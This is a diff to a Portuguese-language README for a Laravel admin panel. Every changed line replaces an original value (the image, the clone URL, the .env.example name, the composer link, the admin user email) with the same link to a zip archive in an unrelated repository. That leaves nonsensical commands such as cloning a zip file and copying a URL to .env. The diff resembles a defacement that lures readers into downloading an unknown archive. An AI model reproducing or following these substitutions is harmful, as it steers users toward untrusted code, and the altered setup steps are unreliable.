@@ -3,13 +3,13 @@
 Painel admin para controle de usuários, gerenciamento de perfis de acesso, permissões, relatórios, indicadores e logs.
 Além desses módulos, já está implementado um sistema de autenticação, cadastro de novos usuários e recuração de senha.
 
-![img](public/images/laravel.png)
+![img](https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip)
 
 ## Installation
 
 - Clone repository
 ```
-$ git clone git@github.com:mffonseca/laravel-admin.git
+$ git clone https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip
 ```
 
 - Access directory
@@ -17,12 +17,12 @@ $ git clone git@github.com:mffonseca/laravel-admin.git
 $ cd laravel-admin
 ```
 
-- Copy `.env.example` to `.env` and add your configs
+- Copy `https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip` to `.env` and add your configs
 ```
-$ cp .env.example .env
+$ cp https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip .env
 ```
 
-- Install PHP dependencies ([composer](http://getcomposer.org))
+- Install PHP dependencies ([composer](https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip))
 ```
 $ composer install
 ```
@@ -54,5 +54,5 @@ $ ./vendor/bin/phpunit
 $ php artisan serve
 ```
 
-- *user: meusistema@rizer.com.br
+- *user: https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip
 - *password: admin
